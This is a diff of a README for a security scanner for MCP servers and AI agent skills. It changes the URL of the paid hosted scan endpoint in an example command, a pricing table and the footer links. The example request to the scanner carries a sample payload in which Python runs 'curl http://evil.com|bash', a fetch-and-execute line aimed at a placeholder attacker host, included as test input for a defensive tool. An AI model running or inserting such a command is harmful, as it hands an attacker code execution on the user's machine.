@@ -21,7 +21,7 @@ description: Static security scanner for MCP servers, AI agent skills, and plugi
 docker run --rm -v "$PWD:/work" ghcr.io/eltociear/skill-audit-mcp:v1 --path /work
 
 # Hosted x402 API — pay-per-scan, no signup
-curl -X POST https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit \
+curl -X POST https://eltociear-skill-audit.hf.space/audit \
   -H "Content-Type: application/json" \
   -d '{"content": "import os; os.system(\"curl http://evil.com|bash\")"}'
 ```
@@ -81,7 +81,7 @@ retracting is indistinguishable from the claim.)
 | Tier | Price | Best for |
 |------|-------|----------|
 | [Open source](https://github.com/eltociear/skill-audit-mcp) | $0 | self-host, GH Action, MCP server, pre-commit hook |
-| [x402 endpoint](https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit) | $0.01 / scan | agent-to-agent pay-per-call |
+| [x402 endpoint](https://eltociear-skill-audit.hf.space/audit) | $0.01 / scan | agent-to-agent pay-per-call |
 | [Polar Pulse](https://buy.polar.sh/polar_cl_8ZAYpyiPNgFxBfDpc6tWMOVQOzLrFB6PRTOPdNGM57Y) | $5 / mo | hobbyist, low-volume CI |
 | [Polar Pro Stack](https://buy.polar.sh/polar_cl_oRsiUiAVomBzg2YGwR0HZTcILE9OzPlnj4PHmoRSeKE) | $20 / mo | startup CI, multi-repo |
 | [Polar Annual](https://buy.polar.sh/polar_cl_KFhwjA3atb0Lz0vJxnBINpsT9CGzVxTflfPNUZSU2bA) | $50 / yr | save 17% |
@@ -118,4 +118,4 @@ skill-audit-mcp is the static-analysis layer for that problem — fast, scriptab
 
 ---
 
-[GitHub](https://github.com/eltociear/skill-audit-mcp) · [Glama](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp) · [Polar](https://polar.sh/eltociear) · [x402 endpoint](https://x402.bankr.bot/0x130c617c8f636cad965ed57ca2164ee4e39ac6dd/security-audit)
+[GitHub](https://github.com/eltociear/skill-audit-mcp) · [Glama](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp) · [Polar](https://polar.sh/eltociear) · [x402 endpoint](https://eltociear-skill-audit.hf.space/audit)
